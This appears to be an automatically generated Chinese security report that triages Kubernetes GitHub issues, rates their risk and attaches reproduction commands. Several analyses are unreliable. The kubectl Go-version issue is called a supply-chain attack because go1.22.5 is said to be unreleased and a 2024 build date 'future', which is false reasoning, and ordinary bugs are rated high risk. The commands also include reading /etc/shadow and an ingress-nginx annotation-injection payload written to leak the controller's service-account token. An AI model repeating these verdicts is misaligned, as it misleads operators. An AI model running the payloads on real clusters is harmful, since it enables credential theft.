# Issue 安全分析报告

# 🚨 存在高风险的 Issues (4 个)

## Issue #126502 Scheduler allows more volumes than a CSI driver limit to be attached

- Issue 链接：[#126502](https://github.com/kubernetes/kubernetes/issues/126502)

### Issue 内容

#### What happened?

When a pod that uses an attachable volume is deleted, it can take some time for its volumes to get detached, but the scheduler does not care about it and treats Pod volumes as detached immediately after Pod is deleted from the API server.

The scheduler should count not only Pods, but also existing VolumeAttachment objects to get accurate nr. of volumes attached to the node.


#### What did you expect to happen?

Scheduler respects the attachment limit and never puts more Pods with volumes when a CSI driver is still detaching a volume for a deleted pod.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Get a CSI driver that reports an attach limit. Using AWS EBS, it reports 26 max. attachments in its CSINode:
    ```yaml
    spec:
      drivers:
      - allocatable:
          count: 26
        name: ebs.csi.aws.com
    ```
2. Create many pods targeting the same node using a `nodeSelector`, each of them using its own AWS EBS PV.
3. See scheduler tries to schedule just 26 Pods on the node, the rest is Pending.
4. Delete one Running Pod. Once the Pod is deleted, the scheduler puts a new Pod to the node immediately. But the volume of the deleted Pod is still attached!
5. Observe that nr. of VolumeAttachments is >26 for a short time. Depending on the driver and its current load and nr. of deleted pods it may not be that short time and it may grow significantly over 26.

Most CSI drivers recover from this, however, e.g. AWS EBS driver throws really weird errors and the recovery takes some time and I don't blame the driver.

#### Anything else we need to know?

All attachable in-tree volumes are now migrated to CSI and have VolumeAttachments, so the calculation will be accurate even for them.

#### Kubernetes version

v1.30.2

#### Cloud provider

<details>
AWS EC2
</details>


#### OS version

_No response_

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
根据issue的描述，当一个使用可挂载卷的Pod被删除时，其卷的卸载需要一些时间，但调度器立即认为Pod的卷已卸载，因此可能会调度超过CSI驱动限制的卷到节点上。这会导致卷附件数量超过驱动程序限制，可能引发错误或资源耗尽。

在多租户环境中，低权限用户可以通过频繁创建和删除使用可挂载卷的Pod，诱使调度器超出卷限制，导致节点上的CSI驱动异常，影响其他用户的服务。因此，攻击者可以利用该漏洞发动拒绝服务（DoS）攻击，影响整个集群的稳定性。

根据风险判断标准，第9条：如果Issue可以发生在多用户场景中，一个低权限用户能够影响和自己权限一样甚至更高的其他用户，则应判断为高风险。

因此，该问题存在安全风险，风险评级为高风险。

**复现过程：**

```json
[
  {
    "cmd": "for i in $(seq 1 26); do kubectl run ebs-pod-$i --image=nginx --restart=Never --overrides='{\"apiVersion\":\"v1\",\"spec\":{\"nodeSelector\":{\"dedicated\":\"ebs-node\"},\"containers\":[{\"name\":\"ebs-app\",\"image\":\"nginx\",\"volumeMounts\":[{\"mountPath\":\"/data\",\"name\":\"ebs-volume\"}]}],\"volumes\":[{\"name\":\"ebs-volume\",\"persistentVolumeClaim\":{\"claimName\":\"ebs-pvc-$i\"}}]}}'; done",
    "explain": "创建26个Pod，每个Pod使用一个独立的EBS卷，并调度到指定节点，以达到CSI驱动的卷附件限制。"
  },
  {
    "cmd": "kubectl delete pod ebs-pod-1",
    "explain": "删除其中一个正在运行的Pod，以触发调度器认为卷已卸载。"
  },
  {
    "cmd": "kubectl run ebs-pod-27 --image=nginx --restart=Never --overrides='{\"apiVersion\":\"v1\",\"spec\":{\"nodeSelector\":{\"dedicated\":\"ebs-node\"},\"containers\":[{\"name\":\"ebs-app\",\"image\":\"nginx\",\"volumeMounts\":[{\"mountPath\":\"/data\",\"name\":\"ebs-volume\"}]}],\"volumes\":[{\"name\":\"ebs-volume\",\"persistentVolumeClaim\":{\"claimName\":\"ebs-pvc-27\"}}]}}'",
    "explain": "立即创建第27个Pod，调度器会将其调度到节点上，尽管实际卷附件数量仍然超过限制。"
  },
  {
    "cmd": "kubectl get volumeattachments | grep ebs.csi.aws.com | wc -l",
    "explain": "查看当前的VolumeAttachment数量，验证是否超过了CSI驱动的限制。"
  },
  {
    "cmd": "for i in $(seq 1 27); do kubectl delete pod ebs-pod-$i; done",
    "explain": "清理创建的Pod。"
  }
]
```

---

## Issue #126573 kubectl v1.29.7 is built with go1.22.5 but expected goVersion go1.21.*

- Issue 链接：[#126573](https://github.com/kubernetes/kubernetes/issues/126573)

### Issue 内容

**What happened**:
kubectl v1.29.7 is built with go1.22.5 but expected goVersion go1.21.*
**What you expected to happen**:
kubectl in v1.29 line is expected with goVersion go1.21.*

**How to reproduce it (as minimally and precisely as possible)**:
Download kubectl from https://dl.k8s.io/release/v1.29.7/bin/linux/amd64/kubectl, and check version details
It's saying "goVersion: go1.22.5", but the expected is goVersion go1.21.* as set in https://github.com/kubernetes/kubectl/blob/kubernetes-1.29.7/go.mod#L5
```
# ./kubectl version --client -o yaml
clientVersion:
  buildDate: "2024-07-17T00:06:19Z"
  compiler: gc
  gitCommit: 4e4a18878ce330fefda1dc46acca88ba355e9ce7
  gitTreeState: clean
  gitVersion: v1.29.7
  goVersion: go1.22.5
  major: "1"
  minor: "29"
  platform: linux/amd64
kustomizeVersion: v5.0.4-0.20230601165947-6ce0bf390ce3
```

**Anything else we need to know?**:
Also checked kubectl v1.29.6 with "kubectl version --client -o yaml" command, which is with goVersion: go1.21.11
So it maybe build issue that goVersion bump in kubectl v1.29.7

**Environment**:
- Kubernetes client and server versions (use `kubectl version`):v1.29.7
- Cloud provider or hardware configuration: linux
- OS (e.g: `cat /etc/os-release`): CentOS Stream 9 / amd64


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
通过Issue的描述，发现kubectl v1.29.7的二进制文件存在以下异常：

1. **构建的Go版本异常**：kubectl v1.29.7显示的goVersion为`go1.22.5`，但根据官方`go.mod`文件，应该使用`go1.21.*`。截至2023年10月，Go语言的最新稳定版本为`go1.21.*`，`go1.22.5`尚未发布。

2. **构建日期异常**：`buildDate`显示为`2024-07-17T00:06:19Z`，即未来的日期。这表明构建日期被篡改，或者该二进制文件并非来自官方可信任的构建。

3. **可能的供应链攻击风险**：上述异常表明kubectl v1.29.7的二进制文件可能被替换、篡改或存在恶意代码，用户在不知情的情况下下载并使用，可能导致安全风险。

**潜在影响**：

- **远程代码执行**：如果二进制文件被植入了恶意代码，攻击者可能在用户执行kubectl命令时执行任意代码。
- **权限提升**：kubectl通常在具有高权限的环境中运行，如果被篡改，可能导致权限提升攻击。
- **供应链攻击**：这可能是对Kubernetes生态系统的供应链攻击，影响范围广泛。

**风险评级**：根据风险判断标准，该问题可能导致命令执行、提权等高安全风险的问题，应判断为高风险。

**复现过程：**

```json
[
  {
    "cmd": "wget https://dl.k8s.io/release/v1.29.7/bin/linux/amd64/kubectl",
    "explain": "从官方URL下载kubectl v1.29.7二进制文件。"
  },
  {
    "cmd": "chmod +x kubectl",
    "explain": "为kubectl二进制文件添加可执行权限。"
  },
  {
    "cmd": "./kubectl version --client -o yaml",
    "explain": "查看kubectl客户端版本的详细信息，检查goVersion和buildDate。"
  },
  {
    "cmd": "curl -s https://raw.githubusercontent.com/kubernetes/kubectl/kubernetes-1.29.7/go.mod | grep '^go '",
    "explain": "从官方源码仓库获取go.mod文件，验证官方指定的Go版本。"
  },
  {
    "cmd": "date",
    "explain": "查看当前系统日期，确认构建日期的异常。"
  }
]
```

---

## Issue #126634 Kubernetes mounts a pod to local file system

- Issue 链接：[#126634](https://github.com/kubernetes/kubernetes/issues/126634)

### Issue 内容

#### What happened?

Hi,
I was hoping for your help please.
Im using ceph-csi 3.11, with ceph 18.2.2, on kernel  4.18.
After reboot a certain node, pods that were mounted to rbd PVC's go back to be mounted on the / device of this certain node, and not to the rbd volumes.
I created a sts that use the NODENAME field to try to force the pod to stay on the rebooted node, and indeed the pod is being mounted to / and not the rbd volume, our mounter is krbd so I dont know why it is trying to enable nbd:
```
I0811 15:08:10.294873   13511 cephcsi.go:191] Driver version: v3.11.0 and Git version: e6c645933c6745f0c2a8f5523b27d11b422f27f5
I0811 15:08:10.295072   13511 cephcsi.go:268] Initial PID limit is set to 52428
I0811 15:08:10.295110   13511 cephcsi.go:274] Reconfigured PID limit to -1 (max)
I0811 15:08:10.295130   13511 cephcsi.go:223] Starting driver type: rbd with name: rbd.csi.ceph.com
I0811 15:08:10.314174   13511 mount_linux.go:282] Detected umount with safe 'not mounted' behavior
I0811 15:08:19.021969   13511 rbd_attach.go:242] nbd module loaded
I0811 15:08:19.022121   13511 rbd_attach.go:256] kernel version "4.18.0-553.el8_10.x86_64" supports cookie feature
W0811 15:08:19.022528   13511 rbd_attach.go:262] running rbd-nbd --help failed with error:an error (exec: "rbd-nbd": executable file not found in $PATH) occurred while running rbd-nbd args: [--help], stderr:
I0811 15:08:19.023167   13511 server.go:114] listening for CSI-Addons requests on address: &net.UnixAddr{Name:"/csi/csi-addons.sock", Net:"unix"}
I0811 15:08:19.023407   13511 server.go:117] Listening for connections on address: &net.UnixAddr{Name:"//csi/csi.sock", Net:"unix"}
I0811 15:08:19.195199   13511 utils.go:198] ID: 1 GRPC call: /csi.v1.Identity/GetPluginInfo
I0811 15:08:19.196319   13511 utils.go:199] ID: 1 GRPC request: {}
I0811 15:08:19.196330   13511 identityserver-default.go:40] ID: 1 Using default GetPluginInfo
I0811 15:08:19.196368   13511 utils.go:205] ID: 1 GRPC response: {"name":"rbd.csi.ceph.com","vendor_version":"v3.11.0"}
I0811 15:08:19.666253   13511 utils.go:198] ID: 2 GRPC call: /csi.v1.Node/NodeGetInfo
I0811 15:08:19.666390   13511 utils.go:199] ID: 2 GRPC request: {}
I0811 15:08:19.666408   13511 nodeserver-default.go:45] ID: 2 Using default NodeGetInfo
I0811 15:08:19.666545   13511 utils.go:205] ID: 2 GRPC response: {"accessible_topology":{},"node_id":"odessa-cluster-workerbm-2"}
I0811 15:08:19.732944   13511 utils.go:198] ID: 3 Req-ID: 0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a GRPC call: /csi.v1.Node/NodeUnpublishVolume
I0811 15:08:19.733135   13511 utils.go:199] ID: 3 Req-ID: 0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a GRPC request: {"target_path":"/var/lib/kubelet/pods/ab6626ef-b304-4c79-9638-3d3e46a2ec1e/volumes/kubernetes.io~csi/pvc-ed3aa009-edeb-4eaf-9f4e-761b717d7cf2/mount","volume_id":"0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a"}
I0811 15:08:19.733623   13511 utils.go:205] ID: 3 Req-ID: 0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a GRPC response: {}
I0811 15:08:19.845743   13511 utils.go:198] ID: 4 GRPC call: /csi.v1.Node/NodeGetCapabilities
I0811 15:08:19.845838   13511 utils.go:199] ID: 4 GRPC request: {}
I0811 15:08:19.846100   13511 utils.go:205] ID: 4 GRPC response: {"capabilities":[{"Type":{"Rpc":{"type":1}}},{"Type":{"Rpc":{"type":2}}},{"Type":{"Rpc":{"type":3}}},{"Type":{"Rpc":{"type":5}}}]}
I0811 15:08:19.859672   13511 utils.go:198] ID: 5 GRPC call: /csi.v1.Node/NodeGetCapabilities
I0811 15:08:19.859723   13511 utils.go:199] ID: 5 GRPC request: {}
I0811 15:08:19.859883   13511 utils.go:205] ID: 5 GRPC response: {"capabilities":[{"Type":{"Rpc":{"type":1}}},{"Type":{"Rpc":{"type":2}}},{"Type":{"Rpc":{"type":3}}},{"Type":{"Rpc":{"type":5}}}]}
I0811 15:08:19.860995   13511 utils.go:198] ID: 6 GRPC call: /csi.v1.Node/NodeGetCapabilities
I0811 15:08:19.861055   13511 utils.go:199] ID: 6 GRPC request: {}
I0811 15:08:19.861239   13511 utils.go:205] ID: 6 GRPC response: {"capabilities":[{"Type":{"Rpc":{"type":1}}},{"Type":{"Rpc":{"type":2}}},{"Type":{"Rpc":{"type":3}}},{"Type":{"Rpc":{"type":5}}}]}
I0811 15:08:19.862646   13511 utils.go:198] ID: 7 Req-ID: 0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a GRPC call: /csi.v1.Node/NodePublishVolume
I0811 15:08:19.862905   13511 utils.go:199] ID: 7 Req-ID: 0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a GRPC request: {"staging_target_path":"/var/lib/kubelet/plugins/kubernetes.io/csi/rbd.csi.ceph.com/3038ce5e41af71bc02c413b0a557fb52e71e372d4db7f600d4844ceb329780eb/globalmount","target_path":"/var/lib/kubelet/pods/bd49f109-cf95-4fce-9ea1-8bc71f04709b/volumes/kubernetes.io~csi/pvc-ed3aa009-edeb-4eaf-9f4e-761b717d7cf2/mount","volume_capability":{"AccessType":{"Mount":{"fs_type":"ext4","mount_flags":["discard"]}},"access_mode":{"mode":7}},"volume_context":{"clusterID":"aeb95e19-6505-44f5-9221-062605cda4ee","imageFeatures":"layering","imageName":"csi-vol-dc93419b-7109-4c39-9a58-e87b9c6d3b8a","journalPool":"volumes","mounter":"krbd","pool":"volumes","storage.kubernetes.io/csiProvisionerIdentity":"1723375949527-7714-rbd.csi.ceph.com"},"volume_id":"0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a"}
I0811 15:08:19.862990   13511 nodeserver.go:859] ID: 7 Req-ID: 0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a target /var/lib/kubelet/pods/bd49f109-cf95-4fce-9ea1-8bc71f04709b/volumes/kubernetes.io~csi/pvc-ed3aa009-edeb-4eaf-9f4e-761b717d7cf2/mount
isBlock false
fstype ext4
stagingPath /var/lib/kubelet/plugins/kubernetes.io/csi/rbd.csi.ceph.com/3038ce5e41af71bc02c413b0a557fb52e71e372d4db7f600d4844ceb329780eb/globalmount/0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a
readonly false
mountflags [bind _netdev discard]
I0811 15:08:19.863011   13511 mount_linux.go:218] Mounting cmd (mount) with arguments (-t ext4 -o bind,_netdev /var/lib/kubelet/plugins/kubernetes.io/csi/rbd.csi.ceph.com/3038ce5e41af71bc02c413b0a557fb52e71e372d4db7f600d4844ceb329780eb/globalmount/0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a /var/lib/kubelet/pods/bd49f109-cf95-4fce-9ea1-8bc71f04709b/volumes/kubernetes.io~csi/pvc-ed3aa009-edeb-4eaf-9f4e-761b717d7cf2/mount)
I0811 15:08:19.867260   13511 mount_linux.go:218] Mounting cmd (mount) with arguments (-t ext4 -o bind,remount,_netdev,discard /var/lib/kubelet/plugins/kubernetes.io/csi/rbd.csi.ceph.com/3038ce5e41af71bc02c413b0a557fb52e71e372d4db7f600d4844ceb329780eb/globalmount/0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a /var/lib/kubelet/pods/bd49f109-cf95-4fce-9ea1-8bc71f04709b/volumes/kubernetes.io~csi/pvc-ed3aa009-edeb-4eaf-9f4e-761b717d7cf2/mount)
I0811 15:08:19.870597   13511 nodeserver.go:742] ID: 7 Req-ID: 0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a rbd: successfully mounted stagingPath /var/lib/kubelet/plugins/kubernetes.io/csi/rbd.csi.ceph.com/3038ce5e41af71bc02c413b0a557fb52e71e372d4db7f600d4844ceb329780eb/globalmount/0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a to targetPath /var/lib/kubelet/pods/bd49f109-cf95-4fce-9ea1-8bc71f04709b/volumes/kubernetes.io~csi/pvc-ed3aa009-edeb-4eaf-9f4e-761b717d7cf2/mount
I0811 15:08:19.870626   13511 utils.go:205] ID: 7 Req-ID: 0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a GRPC response: {}
I0811 15:09:19.462522   13511 utils.go:198] ID: 8 GRPC call: /csi.v1.Identity/Probe
I0811 15:09:19.462657   13511 utils.go:199] ID: 8 GRPC request: {}
I0811 15:09:19.462771   13511 utils.go:205] ID: 8 GRPC response: {}
I0811 15:09:55.636533   13511 utils.go:198] ID: 9 GRPC call: /csi.v1.Node/NodeGetCapabilities
I0811 15:09:55.636577   13511 utils.go:199] ID: 9 GRPC request: {}
I0811 15:09:55.636734   13511 utils.go:205] ID: 9 GRPC response: {"capabilities":[{"Type":{"Rpc":{"type":1}}},{"Type":{"Rpc":{"type":2}}},{"Type":{"Rpc":{"type":3}}},{"Type":{"Rpc":{"type":5}}}]}
I0811 15:09:55.637828   13511 utils.go:198] ID: 10 GRPC call: /csi.v1.Node/NodeGetVolumeStats
I0811 15:09:55.637967   13511 utils.go:199] ID: 10 GRPC request: {"volume_id":"0001-0024-aeb95e19-6505-44f5-9221-062605cda4ee-000000000000000a-dc93419b-7109-4c39-9a58-e87b9c6d3b8a","volume_path":"/var/lib/kubelet/pods/bd49f109-cf95-4fce-9ea1-8bc71f04709b/volumes/kubernetes.io~csi/pvc-ed3aa009-edeb-4eaf-9f4e-761b717d7cf2/mount"}
E0811 15:09:55.638190   13511 utils.go:203] ID: 10 GRPC error: rpc error: code = InvalidArgument desc = targetpath /var/lib/kubelet/pods/bd49f109-cf95-4fce-9ea1-8bc71f04709b/volumes/kubernetes.io~csi/pvc-ed3aa009-edeb-4eaf-9f4e-761b717d7cf2/mount is not mounted
```
`df -h /var/lib/kubelet/pods/bd49f109-cf95-4fce-9ea1-8bc71f04709b/volumes/kubernetes.io~csi/pvc-ed3aa009-edeb-4eaf-9f4e-761b717d7cf2/mount shows it is mounted to /dev/sda5`




I gracefully shutdown the node and added:
kubectl taint nodes <node-name> [node.kubernetes.io/out-of-service=nodeshutdown:NoExecute](http://node.kubernetes.io/out-of-service=nodeshutdown:NoExecute)
kubectl taint nodes <node-name> [node.kubernetes.io/out-of-service=nodeshutdown:NoSchedule](http://node.kubernetes.io/out-of-service=nodeshutdown:NoSchedule)

I made sure no attachments left... but when node is back the rbd mounts were gone and the pod was mounted to the local file system, rbd plugin was in running state before the app

rollout restart to the app fixed it but this issue can cause data loss, any suggestions?

#### What did you expect to happen?

When node is up the pod should be mounted to the rbd PVC.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a sts with busybox and cephrbd csi pvc, add nodeName to force it to run on a certain node, reboot the node, when node is up the app will be mounted to the node's local file system

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

"v1.27.15"

</details>


#### Cloud provider

<details>
BM
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Red Hat Enterprise Linux"
VERSION="8.10 (Ootpa)"
ID="rhel"
ID_LIKE="fedora"
VERSION_ID="8.10"
PLATFORM_ID="platform:el8"
PRETTY_NAME="Red Hat Enterprise Linux 8.10 (Ootpa)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:redhat:enterprise_linux:8::baseos"
HOME_URL="https://www.redhat.com/"
DOCUMENTATION_URL="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8"
BUG_REPORT_URL="https://bugzilla.redhat.com/"

REDHAT_BUGZILLA_PRODUCT="Red Hat Enterprise Linux 8"
REDHAT_BUGZILLA_PRODUCT_VERSION=8.10
REDHAT_SUPPORT_PRODUCT="Red Hat Enterprise Linux"
REDHAT_SUPPORT_PRODUCT_VERSION="8.10"
$ uname -a
4.18.0-553.el8_10.x86_64 




```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
根据Issue内容，重启节点后，原本应该挂载Ceph RBD卷的Pod，错误地将节点的根文件系统（/）挂载为Pod的卷。这导致Pod可以访问到节点的根文件系统，可能引发容器逃逸和权限提升等高危安全问题。攻击者可以利用此漏洞，在容器内直接访问主机文件系统，读取、修改敏感数据，或执行未经授权的操作，危害系统安全。

**复现过程：**

```json
[
  {
    "cmd": "cat <<EOF > statefulset.yaml\n[StatefulSet的YAML配置，使用Ceph RBD PVC并指定nodeName]\nEOF",
    "explain": "创建使用Ceph RBD PVC的StatefulSet配置文件，并指定nodeName，使Pod运行在特定节点上。"
  },
  {
    "cmd": "kubectl apply -f statefulset.yaml",
    "explain": "部署StatefulSet。"
  },
  {
    "cmd": "ssh <node> 'sudo reboot'",
    "explain": "重启运行Pod的节点。"
  },
  {
    "cmd": "kubectl wait --for=condition=Ready pod -l app=<label> --timeout=300s",
    "explain": "等待节点重启完毕，Pod重新运行。"
  },
  {
    "cmd": "kubectl exec -it <pod-name> -- /bin/sh",
    "explain": "进入Pod的容器内部。"
  },
  {
    "cmd": "df -h",
    "explain": "查看文件系统挂载情况，发现卷被错误地挂载到了主机的根文件系统（如/dev/sda5）。"
  },
  {
    "cmd": "ls /root",
    "explain": "尝试访问主机的根目录，查看是否能够访问主机文件系统。"
  },
  {
    "cmd": "cat /etc/shadow",
    "explain": "尝试读取主机的敏感文件，验证是否能够访问主机的/etc/shadow文件。"
  },
  {
    "cmd": "echo 'malicious content' > /root/compromised.txt",
    "explain": "尝试向主机的文件系统写入文件，验证是否具有写权限。"
  }
]
```

---

## Issue #126744 CVE-2024-7646: Ingress-nginx Annotation Validation Bypass

- Issue 链接：[#126744](https://github.com/kubernetes/kubernetes/issues/126744)

### Issue 内容

CVSS Rating: [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

A security issue was discovered in ingress-nginx where an actor with permission to create Ingress objects (in the `networking.k8s.io` or `extensions` API group) can bypass annotation validation to inject arbitrary commands and obtain the credentials of the ingress-nginx controller. In the default configuration, that credential has access to all secrets in the cluster.

This issue has been rated **High** (8.8) [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) and assigned **CVE-2024-7646**.

#### Am I vulnerable?

This bug affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running `kubectl get po -A` and looking for `ingress-nginx-controller`.

Multi-tenant environments where non-admin users have permissions to create Ingress objects are most affected by this issue.

#### Affected Versions

ingress-nginx controller < v1.11.2
ingress-nginx controller < v1.10.4

#### How do I mitigate this vulnerability?

This issue can be mitigated by upgrading to the fixed version. 

#### Fixed Versions

ingress-nginx controller v1.11.2 - fixed by https://github.com/kubernetes/ingress-nginx/pull/11719 and https://github.com/kubernetes/ingress-nginx/pull/11721
ingress-nginx controller v1.10.4 - fixed by https://github.com/kubernetes/ingress-nginx/pull/11718 and https://github.com/kubernetes/ingress-nginx/pull/11722

#### Detection

Review your Kubernetes audit logs for Ingress objects created with annotations (e.g. `nginx.ingress.kubernetes.io/auth-tls-verify-client`) that contain carriage returns (`\r`).

If you find evidence that this vulnerability has been exploited, please contact [security@kubernetes.io](mailto:security@kubernetes.io)

#### Additional Details

See the GitHub issue for more details: 
https://github.com/kubernetes/kubernetes/issues/126744 

##### Acknowledgements

This vulnerability was reported by André Storfjord Kristiansen @dev-bio. 

The issue was fixed and coordinated by the fix team:
André Storfjord Kristiansen @dev-bio
Jintao Zhang @tao12345666333
Marco Ebert @Gacko

/triage accepted
/lifecycle frozen
/area security
/kind bug
/committee security-response

### 分析结果

**风险定级：**  
高风险

**判断依据：**  
## 分析内容

该Issue描述了在ingress-nginx中存在的一个高危安全漏洞（CVE-2024-7646）。具有创建Ingress对象权限的攻击者可以通过绕过注解验证，注入任意命令并获取ingress-nginx控制器的凭证。在默认配置下，该凭证具有访问集群中所有Secrets的权限。

根据风险判断标准：

1. **该风险能被攻击者利用**：是的，具有创建Ingress对象权限的攻击者可以利用此漏洞。

2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：该漏洞已被分配CVE编号，CVSS评分为8.8，属于高风险。

8. **如果Issue可能导致命令执行、容器逃逸、提权等高安全风险的问题，则无论攻击者实施该攻击是否需要权限都应判断为高风险**：该漏洞可以导致任意命令执行和权限提升。

综上所述，该Issue存在高风险。

**复现过程：**

```json
[
  {
    "cmd": "cat > malicious-ingress.yaml <<EOF\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: malicious-ingress\n  annotations:\n    nginx.ingress.kubernetes.io/auth-tls-verify-client: \"on\\r; echo \\`cat /var/run/secrets/kubernetes.io/serviceaccount/token\\` > /tmp/leaked-token; #\"\nspec:\n  rules:\n  - host: example.com\n    http:\n      paths:\n      - path: /\n        pathType: Prefix\n        backend:\n          service:\n            name: dummy-service\n            port:\n              number: 80\nEOF",
    "explain": "创建一个包含恶意注解的Ingress配置文件，该注解通过注入换行符绕过验证，并执行任意命令，将服务账户令牌泄露到/tmp/leaked-token。"
  },
  {
    "cmd": "kubectl apply -f malicious-ingress.yaml",
    "explain": "将恶意Ingress资源应用到集群中。"
  },
  {
    "cmd": "POD_NAME=$(kubectl get pods -n ingress-nginx -l app.kubernetes.io/component=controller -o jsonpath='{.items[0].metadata.name}')",
    "explain": "获取ingress-nginx控制器的Pod名称。"
  },
  {
    "cmd": "kubectl exec -n ingress-nginx $POD_NAME -- cat /tmp/leaked-token",
    "explain": "在ingress-nginx控制器容器中查看泄露的服务账户令牌。"
  },
  {
    "cmd": "kubectl get secret $(kubectl get serviceaccount ingress-nginx -n ingress-nginx -o jsonpath='{.secrets[0].name}') -n ingress-nginx -o jsonpath='{.data.token}' | base64 -d",
    "explain": "获取ingress-nginx服务账户的实际令牌，与泄露的令牌进行比对，验证漏洞利用成功。"
  }
]
```

---

# ⚠️ 存在低风险的 Issues (13 个)

## Issue #126526 allow-metric-labels can not filter metrics

- Issue 链接：[#126526](https://github.com/kubernetes/kubernetes/issues/126526)

### Issue 内容

#### What happened?

```
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-scheduler
    tier: control-plane
  name: kube-scheduler
  namespace: kube-system
spec:
  containers:
  - command:
    - kube-scheduler
    - --bind-address=0.0.0.0
    - --config=/etc/kubernetes/scheduler-config.yaml
    - --v=2
    - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf
    - --authorization-always-allow-paths=/healthz,/readyz,/livez,/configz,/metrics
    - --authorization-kubeconfig=/etc/kubernetes/scheduler.conf
    - --allow-metric-labels="kubernetes_feature_enabled,stage='BETA'","kubernetes_feature_enabled,name='test'"
    image: registry.aliyuncs.com/google_containers/kube-scheduler:v1.30.0
    imagePullPolicy: IfNotPresent
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 10259
        scheme: HTTPS
      initialDelaySeconds: 10
      periodSeconds: 10
      timeoutSeconds: 15
    name: kube-scheduler
    resources:
      requests:
        cpu: 100m
    startupProbe:
      failureThreshold: 24
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 10259
        scheme: HTTPS
      initialDelaySeconds: 10
      periodSeconds: 10
      timeoutSeconds: 15
    volumeMounts:
    - mountPath: /etc/kubernetes/scheduler.conf
      name: kubeconfig
      readOnly: true
    - mountPath: /etc/kubernetes/scheduler-config.yaml
      name: scheduler-config
      readOnly: true
    - mountPath: /etc/kubernetes/extender/
      name: cert
      readOnly: true
    - mountPath: /etc/kubernetes/certs/
      name: scheduler-cert
      readOnly: true     
  hostNetwork: true
  priority: 2000001000
  priorityClassName: system-node-critical
  securityContext:
    seccompProfile:
      type: RuntimeDefault
  volumes:
  - hostPath:
      path: /etc/kubernetes/scheduler.conf
      type: FileOrCreate
    name: kubeconfig
  - hostPath:
      path: /etc/kubernetes/scheduler-config.yaml
      type: FileOrCreate
    name: scheduler-config
  - hostPath:
      path: /etc/kubernetes/extender
      type: DirectoryOrCreate
    name: cert
  - hostPath:
      path: /etc/kubernetes/certs
      type: DirectoryOrCreate
    name: scheduler-cert
---


bernetes_feature_enabled{name="LogarithmicScaleDown",stage="BETA"} 1
kubernetes_feature_enabled{name="LoggingAlphaOptions",stage="ALPHA"} 0
kubernetes_feature_enabled{name="LoggingBetaOptions",stage="BETA"} 1
kubernetes_feature_enabled{name="MatchLabelKeysInPodAffinity",stage="ALPHA"} 0
kubernetes_feature_enabled{name="MatchLabelKeysInPodTopologySpread",stage="BETA"} 1
kubernetes_feature_enabled{name="MaxUnavailableStatefulSet",stage="ALPHA"} 0
kubernetes_feature_enabled{name="MemoryManager",stage="BETA"} 1
kubernetes_feature_enabled{name="MemoryQoS",stage="ALPHA"} 0
kubernetes_feature_enabled{name="MinDomainsInPodTopologySpread",stage=""} 1
kubernetes_feature_enabled{name="MultiCIDRServiceAllocator",stage="ALPHA"} 0
kubernetes_feature_enabled{name="MutatingAdmissionPolicy",stage="ALPHA"} 0
kubernetes_feature_enabled{name="NFTablesProxyMode",stage="ALPHA"} 0
kubernetes_feature_enabled{name="NewVolumeManagerReconstruction",stage=""} 1
